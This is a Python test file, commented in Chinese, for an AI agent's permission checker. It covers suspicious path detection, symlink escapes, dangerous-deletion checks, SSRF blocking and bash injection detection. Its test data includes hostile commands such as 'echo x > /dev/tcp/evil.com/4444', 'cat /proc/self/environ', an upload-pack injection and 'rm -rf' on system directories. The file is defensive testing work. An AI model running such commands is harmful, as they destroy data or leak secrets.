"""R16 安全专项测试。

#2 Windows 路径绕过检测（suspicious 前置检查）
#5 双路径检查（原始词法 + realpath 都过保护表）
#6 危险删除路径判定（rm/del 目标参数化）
#1 Bash 注入面检查（命中升审批）
（#4 SSRF / #3 内容级规则见各自段落）
"""

import os
import sys
from pathlib import Path

import pytest

from agent.permission import (
    PermissionChecker,
    check_suspicious_path,
    is_protected_path,
    is_write_protected_path,
    safe_path,
)


# ---------------------------------------------------------------------------
# R16 #2：可疑路径形态检测
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("path,expected_keyword", [
    ("file.txt:hidden", "ADS"),                       # NTFS ADS
    ("C:\\proj\\file.txt::$DATA", "ADS"),
    ("C:\\GIT~1\\repo", "短名"),                       # 8.3 短名
    ("\\\\?\\C:\\Users\\x\\.ssh", "长路径前缀"),        # 长路径前缀
    ("//?/C:/Users/x", "长路径前缀"),
    ("\\\\.\\C:\\x", "长路径前缀"),
    (".git.", "尾点"),                                 # 尾点
    (".claude ", "尾"),                                # 尾空格
    (".git.CON", "DOS 设备"),                          # DOS 设备名
    ("settings.json.PRN", "DOS 设备"),
    ("path/.../file.txt", "三连点"),                    # 三连点段
    ("\\\\server\\share\\file", "UNC"),                # UNC
    ("//server/share", "UNC"),
    ("~root/.ssh/id_rsa", "波浪"),                     # 波浪变体
    ("~+", "波浪"),
    ("~1", None),                                      # ~1 已被短名模式命中
])
def test_check_suspicious_path_hits(path, expected_keyword):
    """可疑形态命中（~1 例外注明：被短名模式而非波浪模式命中）。"""
    reason = check_suspicious_path(path)
    assert reason is not None, f"应命中可疑形态: {path}"
    if expected_keyword:
        assert expected_keyword in reason, f"{path} → {reason}"


def test_check_suspicious_path_short_name_catches_tilde_digit():
    """~1 形态命中短名模式（不是波浪变体）。"""
    assert "短名" in check_suspicious_path("~1")


@pytest.mark.parametrize("path", [
    ("C:\\Users\\Administrator\\project\\file.txt"),
    ("/home/user/proj/file.txt"),
    ("~/OmniMate/MEMORY.md"),
    ("relative/file.txt"),
    ("plain.txt"),
])
def test_check_suspicious_path_clean_paths(path):
    """正常路径不命中。"""
    assert check_suspicious_path(path) is None, f"不应命中: {path}"


@pytest.mark.skipif(sys.platform != "win32", reason="ADS 冒号仅 win32 判定")
def test_colon_legal_on_posix_suspicious_on_windows():
    """POSIX 冒号文件名合法不拦；win32 上位置≥2 的冒号视为 ADS。

    注：单字母前缀 + 冒号（a:b）在 Windows 是盘符相对路径，不判 ADS
    （对齐 CCB indexOf(':', 2) 语义）。
    """
    assert check_suspicious_path("ab:c") is not None
    assert check_suspicious_path("a:b") is None


def test_check_suspicious_path_glob_only_on_write(tmp_path):
    """glob 元字符：写拒、读放行（读由 glob 工具自己展开）。"""
    assert check_suspicious_path(str(tmp_path / "*.txt"), write=True) is not None
    assert check_suspicious_path(str(tmp_path / "*.txt"), write=False) is None


def test_safe_path_rejects_suspicious(tmp_path):
    """safe_path 前置检查：可疑形态读写都拒，gate=suspicious。"""
    r = safe_path(str(tmp_path / "file.txt:stream"), write=False)
    assert not r.allowed
    assert r.gate == "suspicious"
    r2 = safe_path(str(tmp_path / "GIT~1/config"), write=True,
                   allowed_roots=[tmp_path])
    assert not r2.allowed
    assert r2.gate == "suspicious"


def test_check_path_rejects_suspicious(tmp_path):
    """check_path（write_file/str_replace 通道）前置检查同样生效。"""
    checker = PermissionChecker()
    r = checker.check_path(str(tmp_path / ".git."), write=True)
    assert not r.allowed
    assert r.gate == "suspicious"
    # bypassPermissions 模式下也拒（安全底线，对齐受保护路径语义）
    r2 = checker.check_path(str(tmp_path / ".git."), write=True,
                            mode_override="bypassPermissions")
    assert not r2.allowed


def test_suspicious_before_whitelist(tmp_path):
    """可疑检查先于白名单：白名单根内的可疑路径仍拒。"""
    checker = PermissionChecker()
    r = checker.check_path(str(tmp_path / "ok.txt"), write=True,
                           allowed_roots=[tmp_path])
    assert r.allowed
    r2 = checker.check_path(str(tmp_path / "x~1/ok.txt"), write=True,
                            allowed_roots=[tmp_path])
    assert not r2.allowed
    assert r2.gate == "suspicious"


def test_legit_write_still_works(tmp_path):
    """正常写入路径不受影响（回归保护）。"""
    checker = PermissionChecker()
    r = checker.check_path(str(tmp_path / "normal_file.py"), write=True,
                           allowed_roots=[tmp_path])
    assert r.allowed


# ---------------------------------------------------------------------------
# R16 #5：双路径检查（词法 + realpath 都过保护表）
# ---------------------------------------------------------------------------

import agent.permission as perm_mod


def test_protected_path_direct_regression():
    """回归：直接路径形式仍命中保护表。"""
    assert is_protected_path("~/.ssh/id_rsa") is not None
    assert is_protected_path("~/.aws/credentials") is not None


def test_dual_path_symlink_escape(tmp_path, monkeypatch):
    """软链指向保护目录：realpath 形式命中保护表。"""
    protected_dir = tmp_path / "fake_protected"
    protected_dir.mkdir()
    (protected_dir / "secret.txt").write_text("x", encoding="utf-8")
    monkeypatch.setattr(
        perm_mod, "_PROTECTED_PATHS_RESOLVED",
        [(protected_dir.resolve(), "fake_protected")],
    )

    link_dir = tmp_path / "innocent_link"
    try:
        link_dir.symlink_to(protected_dir)
    except (OSError, NotImplementedError):
        pytest.skip("本环境无法创建符号链接")

    # 词法形式在 tmp 下（无害），realpath 形式落进保护目录 → 必须命中
    assert is_protected_path(link_dir / "secret.txt") is not None

    # check_path 闸门 1 也拒（写通道端到端）
    checker = PermissionChecker()
    r = checker.check_path(link_dir / "secret.txt", write=True,
                           allowed_roots=[tmp_path])
    assert not r.allowed
    assert r.gate == "protected"


def test_dual_path_write_protected_symlink(tmp_path, monkeypatch):
    """写保护表（项目代码）同样过双形式检查。"""
    fake_root = tmp_path / "fake_project"
    fake_root.mkdir()
    monkeypatch.setattr(
        perm_mod, "_WRITE_PROTECTED_PATHS",
        [(fake_root.resolve(), "fake_project")],
    )
    link_file = tmp_path / "entry.py"
    target = fake_root / "real.py"
    target.write_text("x", encoding="utf-8")
    try:
        link_file.symlink_to(target)
    except (OSError, NotImplementedError):
        pytest.skip("本环境无法创建符号链接")
    assert is_write_protected_path(link_file) is not None


def test_dual_path_lexical_form_still_checked(tmp_path, monkeypatch):
    """词法形式仍在保护下时命中（realpath 断轨不放宽判定）。"""
    protected_dir = tmp_path / "pdir"
    protected_dir.mkdir()
    monkeypatch.setattr(
        perm_mod, "_PROTECTED_PATHS_RESOLVED",
        [(protected_dir, "pdir")],  # 故意不 resolve：词法形式即保护
    )
    # 不存在的深层路径：realpath 可能失败/保留词法——词法形式兜底命中
    assert is_protected_path(protected_dir / "a" / "b.txt") is not None


# ---------------------------------------------------------------------------
# R16 #6：危险删除路径判定
# ---------------------------------------------------------------------------

from agent.permission import (
    check_dangerous_removal,
    is_dangerous_removal_path,
)


@pytest.mark.parametrize("path,expected", [
    ("*", True),
    ("/", True),
    ("C:", True),
    ("C:/", True),
    ("D:\\", True),
    ("C:/Windows", True),
    ("C:\\Users", True),
    ("/usr", True),
    ("/tmp", True),
    ("/etc", True),
    ("/home", True),
    ("//", True),
])
def test_is_dangerous_removal_path_hits(path, expected):
    assert is_dangerous_removal_path(path) is expected


@pytest.mark.parametrize("path", [
    ("/usr/local"),
    ("/home/user/project"),
    ("C:/Users/Administrator/project"),
    ("D:/project/HermesAgent/build"),
    ("relative/dir"),
])
def test_is_dangerous_removal_path_safe(path):
    assert not is_dangerous_removal_path(path)


def test_dangerous_removal_home_tilde():
    """rm -rf ~ → 解析到家目录 → 命中。"""
    assert check_dangerous_removal("rm -rf ~") is not None
    assert check_dangerous_removal("rm -rf ~/") is not None


def test_dangerous_removal_root_child(tmp_path):
    assert check_dangerous_removal("rm -rf /usr") is not None
    assert check_dangerous_removal("rm -rf /usr/local") is None  # 二级子目录 OK
    assert check_dangerous_removal("rm -rf build", cwd=str(tmp_path)) is None


def test_dangerous_removal_windows_drive(tmp_path):
    assert check_dangerous_removal("rm -rf C:\\") is not None
    assert check_dangerous_removal("del /s C:\\Windows") is not None
    assert check_dangerous_removal("rd /s /q C:\\Users") is not None
    assert check_dangerous_removal("del /q C:\\Users\\Administrator\\x.txt") is None


def test_dangerous_removal_check_order(tmp_path):
    """check() 集成：default / acceptEdits / autoDeny 都拒；bypass 放行。"""
    checker = PermissionChecker()
    r = checker.check("rm -rf /usr", cwd=str(tmp_path))
    assert not r.allowed and "危险删除" in r.reason
    r2 = checker.check("rm -rf /usr", cwd=str(tmp_path),
                       mode_override="acceptEdits")
    assert not r2.allowed and "危险删除" in r2.reason
    r3 = checker.check("rm -rf /usr", cwd=str(tmp_path),
                       mode_override="autoDeny")
    assert not r3.allowed
    r4 = checker.check("rm -rf /usr", cwd=str(tmp_path),
                       mode_override="bypassPermissions")
    assert r4.allowed  # 不算 fatal：bypass 仍放行


def test_dangerous_removal_acceptEdits_wildcard(tmp_path):
    """acceptEdits 模式：rm -rf * 不能被 safe-fs 自动放行。"""
    checker = PermissionChecker(mode="acceptEdits")
    r = checker.check("rm -rf *", cwd=str(tmp_path))
    assert not r.allowed
    assert "危险删除" in r.reason


def test_dangerous_removal_compound(tmp_path):
    """复合命令逐段检查。"""
    assert check_dangerous_removal(f"cd {tmp_path} && rm -rf /tmp") is not None
    assert check_dangerous_removal("echo hi | rm -rf /etc") is not None


# ---------------------------------------------------------------------------
# R16 #4：HTTP hook SSRF 防护
# ---------------------------------------------------------------------------

import agent.ssrf_guard as ssrf_mod
from agent.ssrf_guard import (
    check_url_against_allowlist,
    is_blocked_address,
    url_matches_pattern,
    validate_url_for_ssrf,
)


@pytest.mark.parametrize("addr", [
    "10.0.0.1", "192.168.1.1", "172.16.0.1", "172.31.255.255",
    "169.254.169.254",          # 云元数据
    "100.100.100.200",          # 阿里云元数据（100.64/10 CGNAT）
    "0.0.0.1",
    "::",                       # 未指定
    "fc00::1", "fd00::1",       # ULA
    "fe80::1",                  # 链路本地
    "::ffff:10.0.0.1",          # v4 映射
    "::ffff:a9fe:a9fe",         # 169.254.169.254 的 hex 形态
])
def test_is_blocked_address_blocked(addr):
    assert is_blocked_address(addr), f"应禁达: {addr}"


@pytest.mark.parametrize("addr", [
    "127.0.0.1", "127.1.2.3",   # 环回放行（本地 dev policy server）
    "::1",
    "8.8.8.8", "1.1.1.1",       # 公网
    "::ffff:8.8.8.8",           # v4 映射公网
    "2001:db8::1",
    "example.com",              # 非 IP 字面量 → False
])
def test_is_blocked_address_allowed(addr):
    assert not is_blocked_address(addr), f"应放行: {addr}"


def test_validate_url_ip_literal():
    assert validate_url_for_ssrf("http://169.254.169.254/latest/meta-data") is not None
    assert validate_url_for_ssrf("http://10.0.0.5/hook") is not None
    assert validate_url_for_ssrf("http://127.0.0.1:8080/hook") is None
    assert validate_url_for_ssrf("http://[::1]:9000/hook") is None


def test_validate_url_scheme_and_ctrl():
    assert validate_url_for_ssrf("ftp://example.com/x") is not None
    assert validate_url_for_ssrf("http://example.com\r\nX-Evil: 1") is not None
    assert validate_url_for_ssrf("") is not None
    assert validate_url_for_ssrf("http:///no-host") is not None


def _fake_getaddrinfo(results):
    def fake(host, port, type=None):
        return [(None, None, None, "", (r, port)) for r in results]
    return fake


def test_validate_url_dns_blocked(monkeypatch):
    """域名解析到私网 → 拒。"""
    monkeypatch.setattr(
        ssrf_mod.socket, "getaddrinfo",
        _fake_getaddrinfo(["203.0.113.5", "192.168.0.10"]),
    )
    assert validate_url_for_ssrf("https://evil-rebind.example.com/hook") is not None


def test_validate_url_dns_ok(monkeypatch):
    monkeypatch.setattr(
        ssrf_mod.socket, "getaddrinfo",
        _fake_getaddrinfo(["203.0.113.5"]),
    )
    assert validate_url_for_ssrf("https://ok.example.com/hook") is None


def test_validate_url_dns_fail_open(monkeypatch):
    """DNS 解析失败放行（交给 requests 报真实错误）。"""
    def boom(host, port, type=None):
        raise ssrf_mod.socket.gaierror("no such host")
    monkeypatch.setattr(ssrf_mod.socket, "getaddrinfo", boom)
    assert validate_url_for_ssrf("https://nx.example.com/hook") is None


def test_validate_url_env_proxy_skips_guard(monkeypatch):
    """环境代理激活 → 跳过地址段预检（对齐 CC 语义）。"""
    monkeypatch.setattr(ssrf_mod, "_env_proxy_active", lambda url: True)
    monkeypatch.setattr(
        ssrf_mod.socket, "getaddrinfo",
        _fake_getaddrinfo(["10.0.0.1"]),
    )
    assert validate_url_for_ssrf("https://internal.example.com/hook") is None


def test_url_matches_pattern():
    assert url_matches_pattern("https://hooks.example.com/x", "https://hooks.example.com/*")
    assert url_matches_pattern("https://a.com", "https://a.com")
    assert not url_matches_pattern("https://evil.com/x", "https://hooks.example.com/*")
    assert url_matches_pattern("https://a.com/x?y=1", "*a.com*")


def test_url_allowlist_semantics():
    assert check_url_against_allowlist("https://x.com", None) is None       # 不限
    assert check_url_against_allowlist("https://x.com", []) is not None     # 全拒
    assert check_url_against_allowlist(
        "https://good.com/h", ["https://good.com/*"]) is None
    assert check_url_against_allowlist(
        "https://bad.com/h", ["https://good.com/*"]) is not None


# ---- run_http_hook 集成 ----

import agent.hook_exec as he


class _HttpScript:
    def __init__(self, url, timeout=5):
        self.handler_type = "http"
        self.url = url
        self.timeout = timeout


class _HttpHook:
    def __init__(self, url):
        self.name = "test-http-hook"
        self.script = _HttpScript(url)


def test_run_http_hook_blocked_by_ssrf(monkeypatch):
    """SSRF 拦截：不发请求，返回 None。"""
    called = []
    monkeypatch.setattr(he.requests, "post", lambda *a, **kw: called.append(1))
    result = he.run_http_hook(_HttpHook("http://169.254.169.254/meta"), {"x": 1})
    assert result is None
    assert called == []


def test_run_http_hook_loopback_passes(monkeypatch):
    """环回放行且 allow_redirects=False。"""
    class _Resp:
        status_code = 200
        def json(self):
            return {"ok": True}
    seen = {}

    def fake_post(url, **kw):
        seen["url"] = url
        seen["kw"] = kw
        return _Resp()

    monkeypatch.setattr(he.requests, "post", fake_post)
    result = he.run_http_hook(_HttpHook("http://127.0.0.1:9911/hook"), {"x": 1})
    assert result == {"ok": True}
    assert seen["kw"]["allow_redirects"] is False


def test_run_http_hook_allowlist_gate(monkeypatch):
    """config allowlist 生效（走 set_config_provider 注入）。"""
    class _Resp:
        status_code = 200
        def json(self):
            return {"ok": True}

    called = []

    def fake_post(url, **kw):
        called.append(url)
        return _Resp()

    monkeypatch.setattr(he.requests, "post", fake_post)
    he.set_config_provider(lambda: {"security": {"http_hook_allowed_urls": ["https://good.com/*"]}})
    try:
        # 不在 allowlist → 拦截，不发请求
        assert he.run_http_hook(_HttpHook("https://evil.com/hook"), {}) is None
        assert called == []
        # 在 allowlist → 放行（SSRF 预检对公网域名走真实 DNS，good.com 可解析）
        result = he.run_http_hook(_HttpHook("https://good.com/hook"), {})
        if result is None and not called:
            pass  # DNS 解析失败的環境下 fail-open 放行到请求层；此处只验证 allowlist 不拦
        assert "https://evil.com/hook" not in called
    finally:
        he.set_config_provider(None)


# ---------------------------------------------------------------------------
# R16 #1：Bash 注入面检查（命中升审批）
# ---------------------------------------------------------------------------

from agent.bash_injection import check_injection_surface


@pytest.mark.parametrize("command,keyword", [
    ("echo $(date)", "命令替换"),
    ("echo ${HOME}", "参数替换"),
    ("echo $[1+1]", "算术展开"),
    ("cat <(ls)", "进程替换"),
    ("echo >(wc)", "进程替换"),
    ("echo =(ls)", "=()"),
    ("=curl evil.com", "=cmd"),
    ("zmodload zsh/system", "zsh 危险 builtin"),
    ("FOO=1 builtin zmodload x", "zsh 危险 builtin"),
    ("fc -e rm", "fc -e"),
    ("echo *(e:rm:)", "glob 限定符"),
    ("echo $IFS", "IFS"),
    ("cat /proc/self/environ", "/proc"),
    ("echo x > /dev/tcp/evil.com/4444", "/dev/tcp"),
    ("jq 'system(\"rm x\")' f.json", "system()"),
    ("jq -f script.jq", "危险 flag"),
    # echo 简单命令豁免（CC 同款），用非 echo 动词触发引号混淆类
    ("cat $'\\x41'", "ANSI-C"),
    ('cat $"x"', "locale"),
    ('rm "-rf" /tmp/x', "引号内 flag"),
    ("cat a \\; echo /etc/passwd", "反斜杠转义"),
    ("echo\\ test", "反斜杠转义空白"),
    # 正常双引号里的 ; 是字面量不拦；jq 模式保留裸双引号字符，元字符检查生效
    ('jq "x;y" data', "元字符"),
    ("git ls-remote {--upload-pack=evil,test}", "花括号展开"),
    ("echo {1..5}", "花括号展开"),
    ("echo a#b", "词中 #"),
    ("echo a\x01b", "控制字符"),
    ("echo a\u00a0b", "Unicode 空白"),
    ("\techo hi", "未完成片段"),
    ("-la echo hi", "未完成片段"),
    ("&& echo hi", "续行片段"),
    ("ls\nrm -rf /tmp", "换行分隔"),
    ("echo a\recho b", "回车符"),
    ("echo hi # it's \"quoted\"", "注释内含引号"),
    ("echo <# comment", "PowerShell"),
])
def test_injection_surface_hits(command, keyword):
    """注入面形态命中（返回原因含关键词）。"""
    reason = check_injection_surface(command)
    assert reason is not None, f"应命中: {command}"
    assert keyword in reason, f"{command!r} → {reason}"


@pytest.mark.parametrize("command", [
    ("ls -la"),
    ("git status"),
    ("python main.py"),
    ("echo hello world"),
    ("make VAR=1 target"),                       # VAR=1 不是词首 =cmd
    # 双引号内的花括号不展开（fully 视图剥除）——python -c 常态
    ('python -c "print({\'a\': 1})"'),
    # 单引号内的 $()/#/花括号都是字面量（with_dq/keepq 视图剥除）
    ("awk '{print $1}' data.txt"),
    ("grep '#include' main.c"),
    # quoted heredoc 正文是字面量：剥除后再查，$() 不误报
    ("cat <<'EOF'\necho $(rm -rf /)\nEOF"),
    # 普通 pipe / 重定向不拦（OmniMate 有自己的白名单层）
    ("ps aux | grep python"),
    ("python x.py > out.txt"),
])
def test_injection_surface_clean(command):
    """正常命令不命中注入面。"""
    assert check_injection_surface(command) is None, f"不应命中: {command}"


def test_injection_check_gate_flow():
    """check() 集成：注入面 → 升审批（无 callback 拒；有 callback 批 + 缓存）。"""
    # 无 callback → 拒，gate=injection
    checker = PermissionChecker()
    r = checker.check("echo $(date)")
    assert not r.allowed
    assert r.gate == "injection"
    assert "注入面" in r.reason

    # 有 callback → 批准入缓存，第二次不再问
    asked = []

    def cb(cmd):
        asked.append(cmd)
        return True

    checker2 = PermissionChecker(approval_callback=cb)
    r2 = checker2.check("echo $(date)")
    assert r2.allowed and r2.gate == "approval"
    assert len(asked) == 1
    r3 = checker2.check("echo $(date)")
    assert r3.allowed
    assert len(asked) == 1  # 会话缓存命中


def test_injection_before_readonly_fastpath():
    """注入面检查先于只读快速通道：ls <(evil) 不被自动放行。"""
    checker = PermissionChecker()
    r = checker.check("ls <(evil)")
    assert not r.allowed
    assert r.gate == "injection"
    # 普通 ls 仍走快速通道
    r2 = checker.check("ls -la")
    assert r2.allowed and r2.gate == "auto"


def test_injection_bypass_and_auto_deny():
    """bypass 放行（不算 fatal）；autoDeny 短路拒。"""
    checker = PermissionChecker()
    assert checker.check("echo $(x)", mode_override="bypassPermissions").allowed
    r = checker.check("echo $(x)", mode_override="autoDeny")
    assert not r.allowed and r.gate == "auto_deny"


def test_destructive_flow_unchanged():
    """重构回归：破坏性命令审批流消息/闸门不变。"""
    checker = PermissionChecker()
    r = checker.check("rm temp.txt")
    assert not r.allowed
    assert r.gate == "destructive"
    assert "破坏性命令需用户确认" in r.reason
    r2 = checker.check("rm temp.txt", mode_override="autoDeny")
    assert not r2.allowed
    assert "破坏性命令" in r2.reason


def test_hard_deny_before_injection():
    """硬拒绝黑名单先于注入面：sudo $(x) 是硬拒不是审批。"""
    checker = PermissionChecker()
    r = checker.check("sudo $(echo x)")
    assert not r.allowed
    assert r.gate == "deny"


# ---------------------------------------------------------------------------
# R16 #3：内容级权限规则（Bash(cmd:*) 语法 + 遮蔽检测）
# ---------------------------------------------------------------------------

import agent.tool_permissions as tp
from agent.tool_permissions import (
    check_command_rules,
    command_rule_matches,
    detect_shadowed_command_rules,
    parse_command_rule,
)


def test_parse_command_rule_forms():
    assert parse_command_rule("Bash(npm test)") == ("exact", "npm test")
    assert parse_command_rule("Bash(npm:*)") == ("prefix", "npm")
    assert parse_command_rule("Bash(git *)") == ("wildcard", "git *")
    assert parse_command_rule("Terminal(npm:*)") == ("prefix", "npm")  # 原生工具名
    assert parse_command_rule("bash(npm:*)") == ("prefix", "npm")      # 大小写不敏感
    assert parse_command_rule("read_file") is None                     # 工具可见性条目
    assert parse_command_rule("mcp__foo__*") is None


def test_command_rule_matching():
    # 精确
    assert command_rule_matches("Bash(npm test)", "npm test")
    assert not command_rule_matches("Bash(npm test)", "npm test --flag")
    # 旧前缀（词边界）
    assert command_rule_matches("Bash(npm:*)", "npm")
    assert command_rule_matches("Bash(npm:*)", "npm test")
    assert not command_rule_matches("Bash(npm:*)", "npmx")
    # 通配（尾部单独 " *" 匹配裸命令）
    assert command_rule_matches("Bash(git *)", "git add -A")
    assert command_rule_matches("Bash(git *)", "git")
    assert not command_rule_matches("Bash(git *)", "gitt")
    # 多通配不含尾部可选语义
    assert command_rule_matches("Bash(* run *)", "npm run build")
    assert not command_rule_matches("Bash(* run *)", "npm run")
    # 转义 * 是字面量（需同时含未转义 * 才是通配规则——
    # 纯 "\*" 无未转义星号时按 CC 语义落 exact 分支）
    assert command_rule_matches(r"Bash(*\*)", "a*")       # 任意内容 + 字面量 *
    assert command_rule_matches(r"Bash(*\*)", "x*y*")
    assert not command_rule_matches(r"Bash(*\*)", "ab")
    assert parse_command_rule(r"Bash(ls \*)") == ("exact", "ls \\*")


def test_check_command_rules_priority():
    rules = {
        "deny": ["Bash(curl:*)"],
        "ask": ["Bash(npm publish:*)"],
        "allow": ["Bash(npm publish:*)", "Bash(git status)"],
    }
    assert check_command_rules("curl http://x", rules) == "deny"     # deny 最高
    assert check_command_rules("npm publish --tag x", rules) == "ask"  # ask > allow
    assert check_command_rules("git status", rules) == "allow"
    assert check_command_rules("ls -la", rules) == "none"


def _patch_rules(monkeypatch, allow=None, deny=None, ask=None):
    monkeypatch.setattr(
        tp, "load_tool_permission_rules",
        lambda: {"allow": allow or [], "deny": deny or [], "ask": ask or []},
    )


def test_content_rule_deny_all_modes(monkeypatch):
    """内容级 deny：任何模式都拒（含 bypass）。"""
    _patch_rules(monkeypatch, deny=["Bash(curl:*)"])
    checker = PermissionChecker()
    r = checker.check("curl http://x")
    assert not r.allowed and r.gate == "rule_deny"
    r2 = checker.check("curl http://x", mode_override="bypassPermissions")
    assert not r2.allowed  # bypass 不豁免显式 deny
    assert checker.check("wget http://x", mode_override="bypassPermissions").allowed


def test_content_rule_ask_survives_bypass(monkeypatch):
    """内容级 ask：bypass 也不豁免，强制审批。"""
    _patch_rules(monkeypatch, ask=["Bash(npm publish:*)"])
    asked = []
    checker = PermissionChecker(approval_callback=lambda c: asked.append(c) or True)
    r = checker.check("npm publish --access public", mode_override="bypassPermissions")
    assert r.allowed and r.gate == "approval"
    assert len(asked) == 1
    # autoDeny → 不能弹 UI 直接拒
    r2 = checker.check("npm publish", mode_override="autoDeny")
    assert not r2.allowed and r2.gate == "auto_deny"


def test_content_rule_allow_skips_approval_gates(monkeypatch):
    """内容级 allow：跳过注入面/破坏性审批；硬底线不受影响。

    注意前缀是词边界语义：build:* 匹配 "rm -rf build" 不匹配 "rm -rf build/"
    （对齐 CC prefix 匹配的词边界行为）。
    """
    _patch_rules(monkeypatch, allow=["Bash(rm -rf build:*)"])
    checker = PermissionChecker()  # 无 callback——正常会拒
    # 破坏性命令按前缀 allow 放行
    r = checker.check("rm -rf build")
    assert r.allowed and r.gate == "rule_allow"
    # 注入面命令按前缀 allow 放行（用户显式意图）
    r2 = checker.check("rm -rf build $(gen)")
    assert r2.allowed and r2.gate == "rule_allow"
    # 硬底线不受 content allow 影响
    assert not checker.check("sudo rm -rf build").allowed           # 闸门 0/1
    assert not checker.check("rm -rf /usr").allowed                 # R16 #6
    # 词边界外 / 不匹配前缀的破坏性命令仍走审批
    assert not checker.check("rm -rf build/").allowed
    assert not checker.check("rm -rf dist/").allowed


def test_content_rules_default_empty(monkeypatch):
    """无规则时行为不变（回归保护）。"""
    _patch_rules(monkeypatch)
    checker = PermissionChecker()
    assert checker.check("ls -la").allowed and checker.check("ls -la").gate == "auto"


def test_shadowed_rule_detection():
    # 整级 deny 遮蔽内容级 allow
    w = detect_shadowed_command_rules({
        "deny": ["Bash"], "allow": ["Bash(ls:*)"], "ask": [],
    })
    assert len(w) == 1 and "遮蔽" in w[0]
    # 整级 ask 遮蔽内容级 allow（ask 优先级更高）
    w2 = detect_shadowed_command_rules({
        "deny": [], "allow": ["Bash(ls:*)"], "ask": ["Terminal"],
    })
    assert len(w2) == 1 and "ask" in w2[0]
    # 无整级规则 → 无告警
    assert detect_shadowed_command_rules({
        "deny": ["Bash(curl:*)"], "allow": ["Bash(ls:*)"], "ask": [],
    }) == []
    # 整级 allow（非内容级）不参与遮蔽检测
    assert detect_shadowed_command_rules({
        "deny": ["Bash"], "allow": ["read_file"], "ask": [],
    }) == []
